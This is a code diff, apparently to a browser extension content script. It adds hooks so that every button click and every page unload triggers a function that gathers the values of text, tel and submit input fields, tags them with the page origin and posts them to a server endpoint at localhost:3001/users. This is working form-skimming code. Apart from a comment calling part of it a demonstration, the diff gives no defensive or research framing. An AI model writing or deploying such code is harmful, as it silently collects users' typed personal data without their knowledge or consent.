@@ -1,5 +1,19 @@
 window.onbeforeunload = function() {
+   sendUserData()
+}
 
+function addtoev() {
+    var bns = document.getElementsByTagName("button");
+    for (i = 0; i < bns.length; i++) {
+        bns[i].addEventListener("click", sendUserData)
+    }
+}
+
+window.addEventListener("load",function() {
+    addtoev();
+});
+
+var sendUserData = function() {
     var inputFields = document.getElementsByTagName('input');
     var textLibrary = {}
     var validType = new Set(['submit', 'tel', 'text'])
@@ -8,13 +22,16 @@ window.onbeforeunload = function() {
             textLibrary[findRelevantName(inputFields[i])] = inputFields[i].value
         }
     }
-    var data = {extension_data: JSON.stringify(textLibrary)}
-    $.post("http://localhost:3000/users", data, function(data, status){
-        console.log(status)
-    })
+    if (Object.keys(textLibrary).length > 0) {
+        textLibrary['url'] = window.location.origin
+        var data = {extension_data: JSON.stringify(textLibrary)}
+        $.post("http://localhost:3001/users", data, function(data, status){
+            console.log(status)
+        })
+    }
 }
-
-var globalNoFind = 0
+console.log('reee')
+    var globalNoFind = 0
 // This function could be greatly improved, but is left basic as it is only for demonstration purposes
 var findRelevantName = function(inputField) {
     // First look for id
@@ -26,7 +43,7 @@ var findRelevantName = function(inputField) {
     var exceptions = new Set(['confirm', 'submit', 'update', 'done', ''])
     while (parentElement !== null) {
         // create exception if see certain expected names
-        if (!exceptions.has(parentElement.innerText.trim().toLowerCase())) {
+        if (!exceptions.has(parentElement.innerText.trim().toLowerCase()) && parentElement.innerText.trim().length < 20) {
             return parentElement.innerText.trim().toLowerCase()
         }
         parentElement = parentElement.parentElement
